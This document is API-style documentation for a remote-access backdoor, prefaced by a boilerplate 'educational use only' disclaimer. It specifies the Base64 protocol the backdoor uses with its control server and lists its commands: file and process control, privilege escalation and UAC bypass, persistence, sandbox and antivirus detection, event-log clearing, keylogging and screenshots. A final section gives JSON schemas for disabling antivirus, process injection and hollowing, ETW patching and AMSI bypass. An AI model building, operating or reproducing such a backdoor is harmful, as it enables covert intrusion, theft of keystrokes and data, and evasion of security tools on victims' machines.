# API Documentation

## Legal Disclaimer

This API documentation is provided for:
- Educational and research purposes only
- Understanding system security concepts
- Learning about API implementation
- Testing security of authorized systems

IMPORTANT NOTICE:
1. This API documentation must NOT be used for malicious purposes
2. The author bears NO responsibility for misuse of this information
3. Users must comply with all applicable laws and regulations
4. Any unauthorized use is strictly prohibited

The API functionality described in this document should ONLY be used:
- On systems you own or have explicit permission to test
- In controlled, legal testing environments
- For legitimate security research
- With proper authorization and documentation

Any use of this API for unauthorized system access or malicious purposes is:
- Strictly prohibited
- Potentially illegal
- NOT endorsed by the author
- Subject to legal consequences

USE THIS INFORMATION RESPONSIBLY AND LEGALLY.

## Network Protocol

### Authentication

Initial connection requires authentication using a pre-shared secret key.

```
-> [Base64(SecretKey)]\n
<- [Base64(Result)]\n
```

### System Information

After successful authentication, the backdoor sends system information.

Format:
```
-> [Base64("privileges|os|arch|isAdmin|version|canElevate|hasUAC")]\n
```

Example:
```
-> [Base64("user|windows|amd64|true|1.0.0|true|true")]\n
```

### Commands

#### Standard Command
```
-> [Base64(command)]\n
<- [Base64(result)]\n
```

#### Update Check
```
-> [Base64("check_update:current_version")]\n
<- [Base64("new_version:checksum:url")] or [Base64("no_update")]\n
```

#### Get Checksum
```
-> [Base64("get_checksum")]\n
<- [Base64(checksum)]\n
```

#### Get Binary
```
-> [Base64("get_binary")]\n
<- [Base64(url)]\n
```

#### Heartbeat
```
-> [Base64("heartbeat")]\n
<- [Base64("ok")]\n
```

## Command Reference

### System Commands

- `sysinfo` - Get detailed system information
- `whoami` - Get current user information
- `hostname` - Get system hostname
- `ps` - List running processes
- `netstat` - Network connections
- `ifconfig/ipconfig` - Network interfaces

### File Operations

- `ls [path]` - List directory contents
- `cd [path]` - Change directory
- `pwd` - Print working directory
- `cat [file]` - View file contents
- `rm [file]` - Remove file
- `mkdir [dir]` - Create directory
- `rmdir [dir]` - Remove directory
- `cp [src] [dst]` - Copy file
- `mv [src] [dst]` - Move file
- `chmod [mode] [file]` - Change file permissions (Linux)
- `attrib [attributes] [file]` - Change file attributes (Windows)

### Process Management

- `kill [pid]` - Terminate process
- `start [program]` - Start program
- `tasklist` - List processes (Windows)
- `taskkill [pid]` - Kill process (Windows)
- `service [action] [name]` - Manage services

### Network Operations

- `download [url] [path]` - Download file
- `upload [path]` - Upload file
- `portfwd add [port]` - Add port forward
- `portfwd remove [port]` - Remove port forward
- `proxy [on/off]` - Toggle SOCKS proxy

### Privilege Operations

- `getsystem` - Attempt privilege escalation
- `getprivs` - List current privileges
- `runas [user] [cmd]` - Run as different user
- `sudo [cmd]` - Run with elevated privileges (Linux)
- `uac bypass` - Attempt UAC bypass (Windows)

### Persistence

- `persist [method]` - Install persistence
- `unpersist [method]` - Remove persistence
- `persist list` - List persistence methods
- `persist status` - Check persistence status

### Anti-Analysis

- `checkvm` - Check for VM
- `checksandbox` - Check for sandbox
- `checkav` - List security products
- `hide` - Enable stealth mode
- `unhide` - Disable stealth mode

### Module Management

- `load [module]` - Load module
- `unload [module]` - Unload module
- `modules` - List available modules
- `reload` - Reload all modules

### Session Management

- `background` - Background session
- `foreground` - Foreground session
- `exit` - Terminate session
- `sleep [seconds]` - Set sleep time
- `connect [address]` - Connect to new server

### Logging

- `clearev` - Clear event logs
- `keyscan_start` - Start keylogger
- `keyscan_stop` - Stop keylogger
- `keyscan_dump` - Dump keylog data
- `screenshot` - Take screenshot

## Error Codes

- `200` - Success
- `400` - Bad request
- `401` - Authentication failed
- `403` - Access denied
- `404` - Not found
- `500` - Internal error
- `503` - Service unavailable

## Security Considerations

1. All communications are encrypted using TLS 1.2+
2. Commands and responses are Base64 encoded
3. Authentication uses a pre-shared key
4. Session timeouts are enforced
5. IP filtering is implemented
6. Binary updates are verified using SHA-256
7. Anti-analysis checks are performed
8. Privilege operations are logged

## Implementation Notes

1. The backdoor maintains persistent connection
2. Heartbeats are sent every 60 seconds
3. Failed connections trigger automatic reconnect
4. Updates are checked every 6 hours
5. Commands are executed asynchronously
6. Results are buffered for large outputs
7. Error handling includes automatic recovery
8. Resource usage is monitored and limited

## Antivirus Evasion Commands

### disable_av
Disable antivirus protection
```json
{
    "command": "disable_av",
    "params": {
        "method": "string",  // Disable method: "service", "registry", "process"
        "target": "string"   // Target antivirus
    }
}
```

### bypass_av
Advanced antivirus bypass
```json
{
    "command": "bypass_av",
    "params": {
        "technique": "string",  // Bypass technique
        "options": {
            "encryption": "string",
            "obfuscation": "string",
            "injection": "string"
        }
    }
}
```

### inject_process
Process injection
```json
{
    "command": "inject_process",
    "params": {
        "pid": "int",          // Target process ID
        "method": "string",    // Injection method
        "payload": "base64"    // Payload data
    }
}
```

### hollow_process
Process hollowing
```json
{
    "command": "hollow_process",
    "params": {
        "target": "string",    // Target process
        "payload": "base64",   // New content
        "args": "string"       // Launch arguments
    }
}
```

### patch_etw
Disable ETW
```json
{
    "command": "patch_etw",
    "params": {
        "method": "string",    // Patching method
        "target": "string"     // Target component
    }
}
```

### bypass_amsi
AMSI bypass
```json
{
    "command": "bypass_amsi",
    "params": {
        "technique": "string", // Bypass technique
        "target": "string"     // Target process
    }
}
``` 